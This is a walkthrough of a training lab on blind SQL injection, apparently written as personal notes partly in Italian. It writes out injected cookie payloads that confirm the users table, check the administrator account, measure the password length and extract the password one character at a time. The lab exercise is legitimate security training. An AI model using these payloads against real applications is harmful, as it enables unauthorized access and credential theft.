This lab contains a blind SQL injection vulnerability.
The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed.
But the application includes a "Welcome back" message in the page if the query returns any rows.

The database contains a different table called users, with columns called username and password.
You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.


IPOTESI  QUERY

SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'lPVWCr0zGtGDlKWR';


1) DETERMINARE VALORE DISCRIMINANTE PER RISULTATO TRUE O FALSE

SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'lPVWCr0zGtGDlKWR';
' AND 1=1--
= SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'lPVWCr0zGtGDlKWR' AND 1=1--;   =>>> "Welcome back!"


SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'lPVWCr0zGtGDlKWR';
' AND 1=2--
= SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'lPVWCr0zGtGDlKWR' AND 1=2--;  =>>> NO "Welcome back!"


2) DETERMINARE L'ESISTENZA DELLA TABELLA users

SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'lPVWCr0zGtGDlKWR';
' AND (SELECT 'x' FROM information_schema.tables WHERE table_name = 'users'  LIMIT 1)='x
= SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'lPVWCr0zGtGDlKWR' AND (SELECT 'x' FROM information_schema.tables WHERE table_name = 'Users'  LIMIT 1)='x';

SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'lPVWCr0zGtGDlKWR';
' AND (SELECT 'x' FROM users LIMIT 1)='x'--
= SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'lPVWCr0zGtGDlKWR' AND (SELECT 'x' FROM users LIMIT 1)='x'--';  =>>> "Welcome back" quindi tabella esiste


3) DETERMINATE L'ESISTENZA DI administrator

SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'lPVWCr0zGtGDlKWR';
' AND (SELECT username FROM users WHERE username='administrator')='administrator'--
= SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'lPVWCr0zGtGDlKWR' AND (SELECT username FROM users WHERE username='administrator')='administrator'--';


4) DETERMINARE LA LUNGHEZZA DELLA PASSWORD DI administrator

SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'lPVWCr0zGtGDlKWR';
' AND (SELECT username FROM users WHERE username='administrator' and LENGTH(password)>1)='administrator'--
= SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'lPVWCr0zGtGDlKWR' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>1)='administrator'--';


5) ENUMERARE CARATTERI DELLA PASSWORD 

SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'lPVWCr0zGtGDlKWR';
' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='administrator')='a'--
= SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'lPVWCr0zGtGDlKWR' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='administrator')='a'--';